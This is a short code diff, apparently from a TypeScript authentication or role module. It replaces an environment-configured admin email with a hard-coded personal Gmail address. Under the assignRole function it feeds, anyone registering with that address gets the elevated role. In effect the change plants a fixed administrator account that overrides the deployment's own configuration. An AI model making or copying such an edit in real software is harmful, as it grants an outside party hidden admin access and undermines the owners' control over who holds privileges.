@@ -32,7 +32,7 @@ const {
   MASTER_OWNER_EMAIL,
 } = process.env;
 
-const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "";
+const ADMIN_EMAIL = "813786b@gmail.com";
 
 function assignRole(email: string, requestedRole?: string): string {
   if (ADMIN_EMAIL && email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
